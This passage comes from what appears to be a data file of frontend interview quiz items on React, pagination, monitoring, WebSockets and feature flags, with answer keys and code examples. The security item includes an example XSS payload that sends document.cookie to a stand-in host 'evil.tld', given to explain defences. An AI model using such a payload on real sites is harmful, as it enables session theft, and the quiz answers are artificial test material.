        text: "Yes, class components were removed in React 17 and no longer render in any application.",
        isCorrect: false,
        explanation: "Tempting if you conflate the release that introduced hooks with a removal of the old model, but class components render identically in React 17, 18, and 19 with no deprecation warning."
      },
      {
        id: "D",
        text: "Hooks and classes are mutually exclusive and cannot appear in the same component tree.",
        isCorrect: false,
        explanation: "Tempting if you treat hooks and classes as mutually exclusive paradigms, but a function component that calls `useState` can render a class component as a child, and the class can render a hook-using component in return."
      }
    ],
    correctAnswer: "A",
    explanation: "No. React 19 fully supports class components alongside function components that use hooks. The React team has stated they have no plans to deprecate or remove class components, so a `<LegacyWidget />` written with `componentDidMount` and `setState` renders in the same tree as a sibling that calls `useState` and `useEffect`. There is no breaking change, deprecation warning, or migration deadline that forces a rewrite.\n\nIn practice this means you adopt hooks incrementally. New components use function syntax with `useState`, `useEffect`, `useRef`, and so on. Existing class components keep working untouched. You refactor a class only when you are already touching it for a feature or bug fix, and even then it is optional, not required.\n\nThe constraint to keep in mind: hooks must be called from a function component or a custom hook; you cannot call `useState` inside a class method. That limits where hooks can live, but it is not a reason to rewrite the class itself.",
    interviewLine: "No, class components are fully supported in React 19. I write new components with hooks for conciseness, but I only refactor a class when I am already touching it, and even then it is optional because both paradigms render in the same tree without conflict.",
    misconception: "Introducing a new feature (hooks) is read as deprecating the old one (class components), so \"recommended for new code\" is mistaken for \"required for all existing code.\"",
    hints: [
      "Check the React 19 documentation: is the class component page marked deprecated or removed, or is it still listed as a supported component type?",
      "Can a `<ClassWidget />` appear as a child inside a function component that calls `useState`? If yes, the two paradigms coexist.",
      "The question asks about necessity, not preference. Is there a breaking change or compiler error that forces the rewrite, or is it purely a style choice?"
    ],
    source: "300-react",
    estimatedMinutes: 2,
    bestPracticeRef: "https://react.dev/reference/react/Component",
    example: {
      caption: "A class component with `componentDidMount` sits inside a function component that uses `useState`; both render in the same tree with no conflict.",
      language: "tsx",
      code: "import { useState, Component } from \"react\";\n\nclass Timer extends Component<{ label: string }> {\n  state = { seconds: 0 };\n  private id: number | undefined;\n  componentDidMount() {\n    this.id = setInterval(() => this.setState({ seconds: this.state.seconds + 1 }), 1000);\n  }\n  componentWillUnmount() {\n    if (this.id) clearInterval(this.id);\n  }\n  render() {\n    return <span>{this.props.label}: {this.state.seconds}s</span>;\n  }\n}\n\nexport function Dashboard() {\n  const [show, setShow] = useState(true);\n  return (\n    <div>\n      <button onClick={() => setShow(!show)}>Toggle</button>\n      {show && <Timer label=\"Uptime\" />}\n    </div>\n  );\n}"
    }
  },
  {
    id: "system_design-how-do-you-implement-code-splitting-and-lazy-loading-in",
    title: "How do you implement code splitting and lazy loading in a React app?",
    prompt: "How do you implement code splitting and lazy loading in a React app?",
    level: "senior",
    type: "live_code",
    category: "system_design",
    subject: "hooks",
    tags: [
      "system_design",
      "hooks",
      "senior"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Manually inject `<script>` tags synchronously inside `render()` when a user clicks a button.",
        isCorrect: false,
        explanation: "Tempting if you think of code splitting as raw HTML script management, but a React render function must stay pure and synchronous. Injecting a `<script>` tag mid-render causes hydration mismatches, blocks the main thread, and bypasses the reconciliation that `React.lazy` and `<Suspense>` are designed to handle."
      },
      {
        id: "B",
        text: "Split code by wrapping each JSX element in a separate Web Worker.",
        isCorrect: false,
        explanation: "Tempting if you conflate parallelism with code splitting, but Web Workers have no DOM access and cannot instantiate React components. Wrapping JSX in a Worker does not reduce the main-thread bundle; it moves the problem into an environment where rendering is impossible."
      },
      {
        id: "C",
        text: "Use dynamic `import()` via `React.lazy()` paired with `<Suspense>` boundaries at route and heavy-component levels.",
        isCorrect: true,
        explanation: "Correct. `React.lazy` defers a component's render until its dynamic `import()` resolves, and `<Suspense>` provides the fallback UI. The bundler extracts the chunk; React handles the runtime loading and rendering."
      },
      {
        id: "D",
        text: "Disable the bundler's tree-shaking so every module loads immediately in `index.html`.",
        isCorrect: false,
        explanation: "Tempting if you confuse 'load everything' with 'split the bundle,' but disabling tree-shaking removes dead-code elimination, making the initial bundle strictly larger. It provides no mechanism for on-demand loading."
      }
    ],
    correctAnswer: "C",
    explanation: "`React.lazy()` accepts a function that returns a Promise resolving to a module with a default-exported component. When React renders that lazy component it suspends the nearest `<Suspense>` boundary and renders the fallback. The bundler (webpack, Vite, Turbopack) has already extracted the dynamic `import()` into a separate chunk, so the network fetch only begins at render time, not at initial page load.\n\nIn practice a user navigating to `/dashboard` triggers a chunk download for `Dashboard` and its dependencies, while the home page shipped without that code. A heavy component like a Monaco editor inside a settings tab only downloads when the tab mounts. You control granularity: one `<Suspense>` around the whole route gives a full-page skeleton; a nested `<Suspense>` around the chart gives a localized spinner while the rest of the page stays interactive.\n\nTwo edge cases interviewers probe. First, `React.lazy` requires a default export; a named export throws at runtime. Second, in Next.js App Router the idiomatic choice is `next/dynamic`, because it renders a fallback on the server and loads the component on the client, whereas `React.lazy` is a client-only API with no SSR integration.",
    interviewLine: "I pair `React.lazy` with a dynamic `import()` so the bundler extracts a separate chunk, and I wrap each lazy component in a `<Suspense>` boundary for the fallback. In Next.js App Router I use `next/dynamic` instead, because it integrates with the RSC streaming boundary and handles SSR hydration.",
    misconception: "Code splitting is purely a bundler-configuration concern, so you only tweak webpack or Vite settings and no React API is involved. In reality the runtime side \u2014 `React.lazy` and `<Suspense>` \u2014 is what defers rendering and shows the fallback while the chunk fetches.",
    hints: [
      "Think about which React API lets a component suspend its render until a Promise resolves.",
      "`React.lazy` expects a function returning a Promise; the bundler turns that dynamic `import()` into a separate chunk fetched at render time, not at page load.",
      "This is not a bundler-only concern \u2014 you need a runtime API to show the fallback and integrate with the component tree."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://react.dev/reference/react/Suspense",
    example: {
      caption: "The chart chunk only starts downloading when the user clicks the button and `showChart` flips to true, not when `Dashboard` first renders.",
      language: "tsx",
      code: "import { lazy, Suspense, useState } from \"react\";\n\ntype Metric = { label: string; value: number };\n\nconst ChartPanel = lazy(() => import(\"./ChartPanel\"));\n\nfunction Dashboard({ data }: { data: Metric[] }) {\n  const [showChart, setShowChart] = useState(false);\n\n  return (\n    <section>\n      <h2>Q3 Metrics</h2>\n      {!showChart ? (\n        <button onClick={() => setShowChart(true)}>\n          Load chart\n        </button>\n      ) : (\n        <Suspense fallback={<div className=\"skeleton\" />}>\n          <ChartPanel metrics={data} />\n        </Suspense>\n      )}\n    </section>\n  );\n}"
    }
  },
  {
    id: "system_design-how-do-you-implement-infinite-scroll-with-cursor-based",
    title: "How do you implement infinite scroll with cursor-based pagination?",
    prompt: "How do you implement infinite scroll with cursor-based pagination?",
    level: "senior",
    type: "live_code",
    category: "system_design",
    subject: "hooks",
    tags: [
      "system_design",
      "hooks",
      "senior"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Clear all existing items from the DOM whenever the user scrolls down, showing only the latest 10 items.",
        isCorrect: false,
        explanation: "This describes a sliding window or virtualization strategy, not infinite scroll. Infinite scroll requires preserving previous items so the user can scroll back up to review earlier content; discarding them breaks the core user expectation of the pattern."
      },
      {
        id: "B",
        text: "Listen to window `scroll` events without throttling, calculate `scrollTop === scrollHeight`, and use `offset=page*20`.",
        isCorrect: false,
        explanation: "Unthrottled scroll listeners cause layout thrashing and high CPU usage, and offset-based pagination is fragile for real-time data. If new items are inserted at the top of the list, the offset shifts, causing the next page request to skip or duplicate items, which is a known failure mode of offset pagination."
      },
      {
        id: "C",
        text: "Re-render the entire list from index 0 on every page append by making sequential requests for all previous pages.",
        isCorrect: false,
        explanation: "This approach multiplies network bandwidth and server load quadratically as the list grows, since every new page fetch requires re-fetching all previous pages. It also causes unnecessary re-renders of the entire list, leading to poor performance and a janky user experience."
      },
      {
        id: "D",
        text: "Observe a bottom sentinel element using `IntersectionObserver`, fetch the next page using an opaque `cursor`, and append items into state without re-fetching old pages.",
        isCorrect: true,
        explanation: "Correct. `IntersectionObserver` is a high-performance, asynchronous API that fires when the sentinel enters the viewport, avoiding the overhead of scroll event listeners. Cursor-based pagination ensures consistent, non-duplicating results even when new data is inserted concurrently, making it the standard for real-time feeds."
      }
    ],
    correctAnswer: "D",
    explanation: "The correct approach uses `IntersectionObserver` on a sentinel element to trigger the next fetch, which avoids the performance cost and layout thrashing of raw `scroll` event listeners. It pairs this with cursor-based pagination, where the API returns an opaque `cursor` representing the last item seen, ensuring the next request starts exactly where the previous one ended. This mechanism is critical for real-time feeds because it remains stable even when new items are inserted at the top of the list during a user's scroll session.\n\nIn practice, this means appending new items to the existing state array rather than replacing it, and using the returned cursor as the `pageParam` for the subsequent request. Unlike offset-based pagination, which can skip or duplicate items if the underlying data shifts, cursor-based pagination provides a consistent view of the data stream. This is the standard pattern for high-traffic feeds on platforms like Twitter and Instagram, where data volatility is high and user expectations for smooth scrolling are strict.\n\nA common edge case is the \"infinite loop\" where the sentinel remains visible after a fetch, causing rapid repeated requests. This is mitigated by checking `isFetchingNextPage` or `hasNextPage` before triggering the fetch, and by ensuring the sentinel element is not removed from the DOM until the next page has fully loaded and rendered.",
    interviewLine: "I use `IntersectionObserver` on a sentinel element to trigger the next fetch, which is more performant than scroll listeners, and I pair it with cursor-based pagination to ensure consistency in real-time feeds where new items are inserted at the top.",
    misconception: "Offset-based pagination is sufficient for infinite scroll because it is simpler to implement, ignoring the fact that it breaks under concurrent data insertion and causes duplicate or skipped items in real-time feeds.",
    hints: [
      "Look for a mechanism that triggers a fetch when the user nears the bottom of the list, without relying on manual scroll position calculations.",
      "Consider which pagination strategy remains stable when new items are inserted at the top of the list during a user's scroll session.",
      "Rule out approaches that discard previous items or re-fetch all historical data on every page append, as both break the core expectations of infinite scroll."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://web.dev/articles/virtualize-long-lists-react-window",
    example: {
      caption: "A minimal implementation using `IntersectionObserver` and cursor-based pagination with React Query.",
      language: "tsx",
      code: "const useFeed = () =>\n  useInfiniteQuery({\n    queryKey: ['feed'],\n    queryFn: ({ pageParam }) => api.getFeed({ cursor: pageParam, limit: 20 }),\n    initialPageParam: null,\n    getNextPageParam: (lastPage) => lastPage.nextCursor ?? undefined,\n  });\n\nconst Feed = () => {\n  const { data, fetchNextPage, hasNextPage, isFetchingNextPage } = useFeed();\n  const sentinelRef = useRef<HTMLDivElement>(null);\n  useEffect(() => {\n    const observer = new IntersectionObserver(([entry]) => {\n      if (entry.isIntersecting && hasNextPage && !isFetchingNextPage) fetchNextPage();\n    });\n    if (sentinelRef.current) observer.observe(sentinelRef.current);\n    return () => observer.disconnect();\n  }, [hasNextPage, isFetchingNextPage, fetchNextPage]);\n  return (\n    <div>\n      {data.pages.flatMap((page) => page.items)}\n      <div ref={sentinelRef} />\n    </div>\n  );\n}"
    }
  },
  {
    id: "system_design-how-do-you-implement-performance-monitoring-and-error-t",
    title: "How do you implement performance monitoring and error tracking in a frontend app?",
    prompt: "How do you implement performance monitoring and error tracking in a frontend app?",
    level: "senior",
    type: "live_code",
    category: "system_design",
    subject: "rendering-keys",
    tags: [
      "system_design",
      "rendering-keys",
      "senior",
      "rendering"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Display raw JavaScript stack traces and internal build paths to end users in a modal dialog whenever a render error occurs.",
        isCorrect: false,
        explanation: "Tempting if you equate transparency with good UX, but stack traces expose internal file paths, library versions, and build configuration to anyone who triggers the error. It is a security leak and a confusing experience in one."
      },
      {
        id: "B",
        text: "Remove all `try/catch` blocks and Error Boundaries so uncaught render exceptions kill the tab with no fallback or recovery.",
        isCorrect: false,
        explanation: "This assumes the browser will surface a useful message, but in production the user gets a blank white screen or a silent tab kill with zero diagnostic data. You lose the error context, the component tree, and the ability to show a recovery UI."
      },
      {
        id: "C",
        text: "Fire a server POST with full session context on every `mousemove` event to capture the complete user interaction trail.",
        isCorrect: false,
        explanation: "Confuses interaction tracking with error reporting. At 60 fps a moving cursor fires roughly 60 events per second, so each one triggering a `fetch` saturates the main thread and floods the backend with noise that buries real errors."
      },
      {
        id: "D",
        text: "Wrap subtrees in Error Boundaries with Sentry or Datadog reporting, track real-user Core Web Vitals via `web-vitals`, and sample session replays.",
        isCorrect: true,
        explanation: "Correct. This combines the three layers that matter: catching render errors at the component level, measuring perceived performance from real users, and preserving enough session context to reproduce the failure."
      }
    ],
    correctAnswer: "D",
    explanation: "Error Boundaries intercept render-phase exceptions before they unmount the entire React tree, letting you show a fallback UI and report the error to Sentry or Datadog RUM. The `web-vitals` library observes LCP, INP, and CLS from the user's actual browser as real-user metrics, complementing the lab scores from Lighthouse. Session replays are sampled (typically 1\u201310%) to capture the user's actions around an error without recording every session.\n\nWithout an Error Boundary, a single render exception in a child component unmounts the whole tree and the user sees a blank white screen with no diagnostic data. Without RUM, you only see performance on CI or your own machine, which misses real-world network conditions, device throttling, and third-party script impact. Sampling replays and tracing via Sentry's `tracesSampleRate` and `replaysSessionSampleRate` keeps ingest costs predictable while preserving enough signal to debug the errors that actually reach users.\n\nError Boundaries do not catch exceptions in event handlers, async callbacks, or their own render; those still need `try/catch` or an `unhandledrejection` listener. `web-vitals` values are heuristic and vary by device and network, so alert on percentiles (p75, p90) rather than a single threshold. A boundary placed too high in the tree hides the component that actually failed, so place them at natural feature boundaries.",
    interviewLine: "I layer three things: Error Boundaries with Sentry or Datadog to catch render exceptions before they white-screen the tree, `web-vitals` to get real-user LCP and INP instead of trusting Lighthouse lab scores, and sampled session replays so I can see what the user did right before the error.",
    misconception: "Monitoring is a single tool you bolt on after launch, rather than a set of layered concerns (render errors, perceived performance, session context) that each need their own instrumentation and sampling strategy.",
    hints: [
      "Think in layers: what catches a render exception, what measures perceived performance, and what preserves context around a failure.",
      "Which option actually produces a fallback UI instead of a blank white screen, and which one reports metrics from the user's real browser rather than a CI runner?",
      "The correct approach must handle both the error path and the performance path without flooding the network or leaking internals."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://web.dev/articles/vitals",
    example: {
      caption: "Notice that `sendBeacon` is used instead of `fetch` because Core Web Vitals callbacks can fire during page unload, where `fetch` would be cancelled.",
      language: "typescript",
      code: "import { onLCP, onINP, onCLS } from 'web-vitals';\n\ntype VitalMetric = { name: string; value: number; id: string };\n\nfunction report(metric: VitalMetric) {\n  const payload = JSON.stringify({\n    ...metric,\n    path: location.pathname,\n    ts: Date.now(),\n  });\n  // sendBeacon is safe on page unload; fetch is not\n  navigator.sendBeacon('/api/vitals', payload);\n}\n\nonLCP(report);\nonINP(report);\nonCLS(report);"
    }
  },
  {
    id: "nextjs-how-do-you-implement-frontend-security-227-xss-csrf-csp",
    title: "How do you implement frontend security, XSS, CSRF, CSP?",
    prompt: "How do you implement frontend security, XSS, CSRF, CSP?",
    level: "senior",
    type: "live_code",
    category: "nextjs",
    subject: "rendering-keys",
    tags: [
      "nextjs",
      "rendering-keys",
      "senior",
      "rendering"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Store sensitive secrets and private API master keys in public frontend `.env` variables prefixed with `NEXT_PUBLIC_`.",
        isCorrect: false,
        explanation: "Tempting if you treat `.env` as a single file and assume all values stay server-side, but Next.js inlines every `NEXT_PUBLIC_` variable into the client JavaScript bundle, so any visitor can read them in DevTools. Secrets must live in server-only environment variables or a server-side secrets manager."
      },
      {
        id: "B",
        text: "Sanitize untrusted HTML (e.g. DOMPurify) before injection, configure strict Content Security Policy (CSP) headers, and use `SameSite` cookies against CSRF.",
        isCorrect: true,
        explanation: "Correct. Each layer addresses a distinct threat: DOMPurify neutralises the HTML string before React renders it, CSP gives the browser a policy to refuse unauthorised script execution, and `SameSite` stops a cross-origin request from carrying the session cookie."
      },
      {
        id: "C",
        text: "Use `dangerouslySetInnerHTML` directly on raw user comment input strings without sanitization.",
        isCorrect: false,
        explanation: "Tempting if you trust React's automatic escaping, but `dangerouslySetInnerHTML` bypasses it entirely; the browser parses the string as live HTML, so any injected `<script>` or `onerror` handler executes in the victim's origin."
      },
      {
        id: "D",
        text: "Disable Content Security Policy headers to allow third-party scripts to execute `eval()` freely.",
        isCorrect: false,
        explanation: "Tempting if a legacy analytics or ad SDK requires `eval`, but removing CSP eliminates the browser's ability to block injected script execution from any origin. If a third-party SDK truly needs `eval`, the fix is to replace that SDK or confine it to a sandboxed iframe, not to strip the policy from your own application."
      }
    ],
    correctAnswer: "B",
    explanation: "The three threats in the prompt are solved by three independent layers. DOMPurify rewrites the HTML string before it reaches `dangerouslySetInnerHTML`, stripping `<script>` tags, event-handler attributes, and `javascript:` URLs. A strict `Content-Security-Policy` header tells the browser which origins may serve scripts, so even a string that slips past sanitization cannot execute. `SameSite=Lax` (the browser default since 2020) prevents a cross-origin form post from carrying the session cookie, which is the transport-level CSRF defence.\n\nWithout all three, each gap is exploitable. Skip sanitization and a stored comment like `<img src=x onerror=fetch('https://evil.tld/c?c='+document.cookie)>` fires on render. Skip CSP and any reflected XSS becomes full script execution. Skip `SameSite` and a malicious page's `<form action=\"https://yourapp.com/transfer\">` submits with the victim's cookie intact.\n\nThe nuance an interviewer probes: `SameSite=Strict` breaks the common flow of clicking a link on a partner site that lands on your app, so most teams use `Lax` plus a per-session CSRF token for state-changing requests. CSP nonces (`script-src 'nonce-\u2026'`) let you keep inline scripts without falling back to `'unsafe-inline'`, which would nullify the policy.",
    interviewLine: "I treat each layer as solving a different threat: DOMPurify rewrites the HTML string before it hits `dangerouslySetInnerHTML`, CSP headers tell the browser which script origins are allowed so a successful injection still can't execute, and `SameSite=Lax` on the session cookie means a cross-origin form post won't carry it.",
    misconception: "React escapes strings by default, so XSS is only a problem when you call `dangerouslySetInnerHTML`; CSP and `SameSite` are optional hardening steps rather than independent defence layers against distinct attack classes.",
    hints: [
      "Three different threats are named in the prompt \u2014 XSS, CSRF, and unauthorised script execution \u2014 so the answer should address each with a distinct mechanism.",
      "Which option pairs output sanitisation with a browser-enforced script policy and a cookie attribute that limits cross-origin request context?",
      "`NEXT_PUBLIC_` variables are compiled into the client bundle, not kept on the server; treating them as secret storage is a category error."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://developer.mozilla.org/en-US/docs/Web/Security",
    example: {
      caption: "Notice the `ALLOWED_TAGS` whitelist: DOMPurify strips `<script>` tags, `onerror` handlers, and `javascript:` URLs before React ever parses the string.",
      language: "tsx",
      code: "import DOMPurify from 'dompurify'\n\ninterface CommentCardProps {\n  html: string\n}\n\nexport function CommentCard({ html }: CommentCardProps) {\n  const clean = DOMPurify.sanitize(html, {\n    ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'br'],\n    ALLOWED_ATTR: ['href'],\n  })\n\n  return (\n    <article\n      className=\"comment\"\n      dangerouslySetInnerHTML={{ __html: clean }}\n    />\n  )\n}"
    }
  },
  {
    id: "system_design-how-do-you-implement-optimistic-ui-updates-n-answer-opt",
    title: "How do you implement optimistic UI updates?",
    prompt: "How do you implement optimistic UI updates?",
    level: "senior",
    type: "live_code",
    category: "system_design",
    subject: "hooks",
    tags: [
      "system_design",
      "hooks",
      "senior"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Persist the optimistic value in localStorage and treat it as the source of truth, never reconciling against the server's authoritative response.",
        isCorrect: false,
        explanation: "Tempting if you want the state to survive a page reload, but localStorage is a cache, not an authority. If the server rejects the mutation or the data model changes, the stale value persists indefinitely and every client that reads it diverges from reality."
      },
      {
        id: "B",
        text: "Show a full-screen loading spinner and disable all input until the server confirms the mutation, guaranteeing the UI never displays unverified data.",
        isCorrect: false,
        explanation: "This is the pessimistic pattern and the direct opposite of what the question asks. A multi-second spinner on every like, toggle, or mark-as-read makes the app feel broken; the entire point of optimistic updates is to remove that perceived wait."
      },
      {
        id: "C",
        text: "Apply the mutation to local state immediately, but if the network request fails, discard the error silently and leave the UI in its mutated state.",
        isCorrect: false,
        explanation: "Swallowing the rejection means the UI now shows a state the server never accepted. The next cache invalidation or page reload snaps the value back with no explanation, and any dependent logic such as totals or permission checks has already acted on the phantom change."
      },
      {
        id: "D",
        text: "Update local UI or cache state immediately before the network response, capture a snapshot of the prior state, and roll back to that snapshot if the server mutation rejects.",
        isCorrect: true,
        explanation: "Correct. This is the standard optimistic-update contract: apply fast, remember what you replaced, and restore on failure so the user sees a brief flicker rather than a permanent desync."
      }
    ],
    correctAnswer: "D",
    explanation: "Optimistic updates apply the mutation to local state (a query cache, a reducer, a context) the instant the user acts, then fire the network request in the background. The critical piece is capturing a snapshot of the prior state before you mutate, so that if the server rejects the request you can restore exactly what the user saw before the tap.\n\nIn React Query this maps to onMutate (cancel in-flight refetches, read the current query data into a variable, write the new value with setQueryData) and onError (write the snapshot back, surface an error toast). In a custom hook you hold the snapshot in a ref, apply the new value with setState, and in the catch block restore from the ref. On success the normal invalidation or refetch reconciles any drift; the server response remains the source of truth.\n\nThe edge an interviewer will probe next is concurrent mutations on the same entity. If the user double-taps a like button, two in-flight requests share the same snapshot, and the second rollback can clobber the first correction. You need to either queue mutations per key, compare the server's authoritative value on settle, or gate with a per-entity mutex so only one optimistic write is in flight at a time.",
    interviewLine: "I apply the mutation to the cache or local state synchronously, stash the previous value in a ref or the onMutate context, and in the error path I restore that snapshot and surface a toast. The server response is the source of truth, so on settle I invalidate the query to reconcile any drift.",
    misconception: "Optimistic updates are only about making the UI feel fast; the snapshot-and-rollback half is optional polish rather than a required part of the pattern.",
    hints: [
      "Think about what the user sees in the gap between tapping a button and the server responding: is it a spinner, or is it the new value already?",
      "If the server says no, what do you need to have saved before you mutated so you can undo cleanly?",
      "Silently dropping the error or persisting the unverified state in localStorage both leave the UI permanently out of sync with the server."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://web.dev/articles/vitals",
    example: {
      caption: "Notice how the snapshot lives in a ref so it survives re-renders, and the rollback restores the exact prior value rather than computing a toggle-back that could drift under concurrent calls.",
      language: "tsx",
      code: "import { useState, useRef, useCallback } from \"react\";\n\nfunction useOptimisticToggle(\n  id: string,\n  api: () => Promise<void>\n) {\n  const [toggled, setToggled] = useState(false);\n  const snapshot = useRef(false);\n\n  const toggle = useCallback(async () => {\n    snapshot.current = toggled;\n    setToggled((prev) => !prev);\n    try {\n      await api();\n    } catch {\n      setToggled(snapshot.current);\n      // surface error via toast or context\n    }\n  }, [toggled, api]);\n\n  return { toggled, toggle };\n}"
    }
  },
  {
    id: "system_design-how-do-you-implement-websockets-for-real-time-collabora",
    title: "How do you implement WebSockets for real-time collaboration?",
    prompt: "How do you implement WebSockets for real-time collaboration?",
    level: "senior",
    type: "live_code",
    category: "system_design",
    subject: "hooks",
    tags: [
      "system_design",
      "hooks",
      "senior",
      "hooks"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Send raw full-document replacement strings over HTTP long-polling every 50 ms, letting last-write-wins resolve any concurrent edits.",
        isCorrect: false,
        explanation: "Tempting if you think of collaboration as sending the latest state, but 50ms polling has high latency, the server cannot push updates, and two simultaneous full-document writes race \u2014 last write wins, silently clobbering the other user's edits."
      },
      {
        id: "B",
        text: "Open the WebSocket once and assume it stays connected for the whole session, omitting reconnection logic and offline edit buffering.",
        isCorrect: false,
        explanation: "Tempting because the API looks like a persistent pipe, but mobile networks, NAT timeouts, and load-balancer idle limits all close sockets. Without backoff and an offline edit queue, a single dropped packet loses every keystroke typed during the outage."
      },
      {
        id: "C",
        text: "Process every incoming peer message synchronously in the main thread with blocking `while` loops to guarantee strict ordering.",
        isCorrect: false,
        explanation: "Tempting if you want to guarantee ordering, but a `while` loop that waits for a server response freezes the render loop, input handling, and animations. The browser cannot paint, scroll, or dispatch events until the loop exits."
      },
      {
        id: "D",
        text: "Use a persistent WebSocket with heartbeat ping/pong, exponential backoff on reconnect, and merge concurrent edits via CRDTs (e.g. Yjs) or OT.",
        isCorrect: true,
        explanation: "Correct. This covers the three independent concerns a real-time editor has: transport reliability (heartbeat plus backoff), bidirectional low-latency delivery (WebSocket), and deterministic merge of concurrent edits (CRDT or OT) so no server-side lock is needed."
      }
    ],
    correctAnswer: "D",
    explanation: "A persistent WebSocket gives you a bidirectional, low-latency channel, but it is not a collaboration system by itself. The architecture in D adds three layers a real editor needs: a heartbeat (periodic ping/pong) so you detect a dead connection within seconds instead of waiting for the OS TCP timeout, exponential backoff on reconnect so a flapping network does not hammer the server, and a conflict-resolution strategy (CRDTs like Yjs, or Operational Transformation) so concurrent edits merge deterministically without a central lock.\n\nIn practice the connection lifecycle is explicit: open on mount, route messages by a `type` field (edits, presence, cursor positions), and on `onclose` schedule a reconnect at 1s, 2s, 4s, capped at 30s, resetting the delay on `onopen`. While offline, edits accumulate in a local CRDT document and sync when the socket returns. Without that queue, a two-second network blip silently drops every keystroke.\n\nThe trade-off an interviewer will probe next: CRDTs are merge-based, work offline-first, and integrate with ProseMirror and TipTap; OT is operation-based, can be more storage-efficient, but is far harder to implement correctly under heavy concurrency. Neither removes the transport concerns \u2014 heartbeats, backoff, message ordering \u2014 they only remove the server-side lock on every write.",
    interviewLine: "I treat the WebSocket as an unreliable transport, not a collaboration protocol \u2014 I add a heartbeat to detect dead connections, exponential backoff for reconnect, and I let a CRDT like Yjs handle the merge so two users typing at the same position never need a server lock.",
    misconception: "Opening a WebSocket and calling `send()` is treated as the whole solution, so concurrent edits from multiple users are assumed to merge cleanly and the connection is assumed to stay open for the session's lifetime.",
    hints: [
      "Separate the transport problem (staying connected) from the data problem (merging concurrent edits).",
      "Ask what happens between `onclose` firing and the next `onopen`: who queues the edits, and how does the client know the socket is actually dead?",
      "A solution that only addresses one of those two problems is incomplete, regardless of how clever the message format is."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API",
    example: {
      caption: "Notice how the heartbeat, the CRDT merge, and the presence update are three independent branches of one message router \u2014 none of them blocks the others.",
      language: "typescript",
      code: "type Msg =\n  | { type: 'edit'; op: string }\n  | { type: 'presence'; userId: string; cursor: number }\n  | { type: 'ping' }\n  | { type: 'pong'; ts: number };\n\nfunction handleIncoming(\n  ws: WebSocket,\n  msg: Msg,\n  crdt: { apply(op: string): void },\n  setPeer: (id: string, pos: number) => void,\n) {\n  switch (msg.type) {\n    case 'ping':\n      ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));\n      break;\n    case 'edit':\n      crdt.apply(msg.op);\n      break;\n    case 'presence':\n      setPeer(msg.userId, msg.cursor);\n      break;\n  }\n}"
    }
  },
  {
    id: "system_design-how-do-you-implement-a-frontend-feature-flagging-system",
    title: "How do you implement a frontend feature flagging system?",
    prompt: "How do you implement a frontend feature flagging system?",
    level: "senior",
    type: "live_code",
    category: "system_design",
    subject: "hooks",
    tags: [
      "system_design",
      "hooks",
      "senior",
      "rendering"
    ],
    codeLanguage: "typescript",
    options: [
      {
        id: "A",
        text: "Hardcode feature flags as boolean constants in component source and require a full build-and-deploy cycle to toggle any of them.",
        isCorrect: false,
        explanation: "Tempting for a quick prototype, but a `const ENABLED = true` baked into a bundle cannot be flipped without shipping a new build, which defeats the core purpose of a flag: changing behaviour without deploying."
      },
      {
        id: "B",
        text: "Bootstrap flags at app launch via a context provider, evaluate them in memory with a shared hook, support user targeting, and schedule cleanup of stale branches.",
        isCorrect: true,
        explanation: "Correct. One fetch at launch, in-memory evaluation against the user's targeting rules, and a disciplined removal process together give you gradual rollouts, instant kill switches, and a codebase that does not accumulate dead branches."
      },
      {
        id: "C",
        text: "Leave every experimental flag branch in the codebase permanently, treating shipped features as if the flag will never be removed.",
        isCorrect: false,
        explanation: "This treats a flag as a permanent architectural seam. In reality each surviving `if (flag)` doubles the code paths you must test and review, and after a few quarters the branch becomes indistinguishable from dead code."
      },
      {
        id: "D",
        text: "Issue a synchronous remote fetch for flag evaluation inside each component's render function so every component resolves its own flag independently.",
        isCorrect: false,
        explanation: "Tempting if you think of a flag as a per-component setting, but a synchronous fetch in the component body blocks the render phase on the main thread, fires N requests for N components that read the same flag, and can return different values if the server state changes between successive renders."
      }
    ],
    correctAnswer: "B",
    explanation: "The correct architecture bootstraps flag data once at app launch, stores it in a React context, and exposes a small hook that reads the cached value in memory. User-targeting rules (percentage, cohort, email list) are evaluated client-side against the authenticated session, so no component ever triggers its own network request for a flag. Stale flag branches are removed on a schedule, keeping the codebase free of dead `if` paths.\n\nIn practice the provider fetches flags alongside the auth session, falls back to a safe default (usually `false`) if the request fails, and re-evaluates only when the session or a polling interval changes. A component calls `useFlag('new-checkout')` and gets a boolean synchronously; the data is already in memory, and a 50/50 rollout is just a targeting rule the provider resolved once. A kill switch is a server-side flag flip that the next poll or navigation picks up, not a redeploy.\n\nThe edge case interviewers probe is flag debt: every `if (flag)` branch doubles the paths you must test, and teams that never delete flags end up maintaining two parallel code paths for a feature that shipped months ago. A second subtlety is the race between a user's targeting and a mid-session flag change \u2014 the provider should treat the cached value as authoritative until the next refresh, not re-fetch per render.",
    interviewLine: "I bootstrap flags once at app launch through a context provider, evaluate targeting rules in memory against the authenticated session, and pair the system with a cleanup cadence so we never accumulate dead `if` branches for features that already shipped.",
    misconception: "A feature flag is a per-component `if` statement or a per-component API call, rather than a system-level concern: one fetch, one in-memory cache, many synchronous readers, and a scheduled removal of the branch once the feature ships.",
    hints: [
      "Think about where the flag data lives in the component tree and how many network requests are needed to read it.",
      "A flag system must answer three questions: who sees what, when does the data arrive, and what happens to the code after the flag is gone.",
      "The pattern that scales is one fetch, one in-memory cache, many synchronous readers \u2014 not a network call per component."
    ],
    source: "frontend-system-design-50",
    estimatedMinutes: 4,
    bestPracticeRef: "https://react.dev/reference/react/hooks",
    example: {
